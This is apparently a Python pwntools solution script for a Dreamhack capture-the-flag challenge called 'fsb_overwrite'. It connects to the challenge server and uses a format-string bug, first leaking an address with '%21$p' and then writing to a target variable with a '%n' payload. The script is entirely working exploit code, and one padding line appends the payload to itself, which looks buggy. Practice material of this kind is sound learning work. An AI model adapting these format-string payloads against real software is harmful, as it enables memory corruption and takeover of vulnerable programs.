#!/usr/bin/python3

from pwn import *

context.binary=exe=ELF('./fsb_overwrite',checksec=False)
# p=process(exe.path)
p=remote('host3.dreamhack.games',18418)

#########################################
#LEAK changeme address ##################
#########################################
# gdb.attach(p,gdbscript='''
# b*main+76
# c
# 	''')
# input()
payload=b''
payload+=b'%21$p'
p.send(payload)
leak=int(p.recv(),16)
exe_leak=leak-4755
changeme=exe_leak+16412

log.info("leak address: "+hex(leak))
log.info("exe leak : "+hex(exe_leak))
log.info("leak changeme address: "+hex(changeme))
#################################
##using %n to override changeme##
#################################
payload=b'%1337c%8$nAAAAAA'
payload+=p64(changeme)
payload+=payload.ljust(0x20	,b'B')
p.send(payload)

p.interactive()